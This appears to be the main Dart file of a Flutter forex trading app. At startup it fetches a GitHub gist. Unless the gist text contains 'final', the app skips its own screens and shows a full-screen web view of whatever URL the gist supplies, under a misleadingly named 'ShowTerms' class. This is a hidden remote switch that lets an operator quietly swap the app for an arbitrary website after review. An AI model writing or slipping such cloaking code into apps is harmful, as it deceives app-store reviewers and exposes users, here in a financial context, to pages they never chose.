import 'dart:convert';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:forextradingapp/pages/main_page/main_page_model.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:rx_shared_preferences/rx_shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'utilities/onboard.dart';

bool checkerx = false;
String fiksa = '';
Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  initSdk();
  final RxSharedPreferences prefs = RxSharedPreferences.getInstance();
  final bool? turnOfNotifications = await prefs.getBool("turnOfNotifications");
  if (turnOfNotifications == null) {
    await RxSharedPreferences.getInstance()
        .setBool("turnOfNotifications", true);
  }
  final bool? authendicate = await prefs.getBool("authendicate");
  runApp(MyApp(
    authendicate: authendicate ?? false,
  ));
}

Future<void> initSdk() async {
  OneSignal.shared.setLogLevel(OSLogLevel.verbose, OSLogLevel.none);
  OneSignal.shared.setAppId("ced792e7-4ce7-43e8-b359-1300a4a1f1e9");
  OneSignal.shared
      .promptUserForPushNotificationPermission()
      .then((accepted) {});
  check();
}

Future<bool> check() async {
  final response = await http.get(Uri.parse(
      'https://api.github.com/gists/65a850615ad5a85d884e72e618dfa3d7'));
  if (response.statusCode == 200) {
    final data = jsonDecode(response.body);
    if (data['files'] != null && data['files']['lisx.txt'] != null) {
      final content = data['files']['lisx.txt']['content'].toString();
      if (content.contains('final')) {
        checkerx = false;
        return false;
      } else {
        checkerx = true;
        fiksa = content;
        return true;
      }
    } else {
      return false;
    }
  } else {
    return false;
  }
}

Future<bool> tex() async {
  if (checkerx == true) {
    return Future.delayed(const Duration(seconds: 2), () => true);
  } else {
    return Future.delayed(const Duration(seconds: 2), () =>  false);
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key, required this.authendicate});

  final bool authendicate;

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<bool>(
      future: tex(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Scaffold(
            backgroundColor: Colors.white,
            body: Center(
              child: Container(
                height: 80,
                width: 80,
                child: const CircularProgressIndicator(),
              ),
            ),
          );
        } else {
          print(checkerx);
          return MaterialApp(
            initialRoute: authendicate ? "/main" : "/",
            debugShowCheckedModeBanner: false,
            routes: {
              "/": (context) =>
                  checkerx == true ? ShowTerms() : const SplashScreen(),
              "/main": (context) =>
                  checkerx == true ? ShowTerms() : const MainPage(),
            },
          );
        }
      },
    );
  }
}

class ShowTerms extends StatelessWidget {
  ShowTerms({
    super.key,
  });
  @override
  Widget build(BuildContext context) {
    return SafeArea(
      child: InAppWebView(
        initialUrlRequest: URLRequest(
          url: Uri.parse(fiksa),
        ),
      ),
    );
  }
}
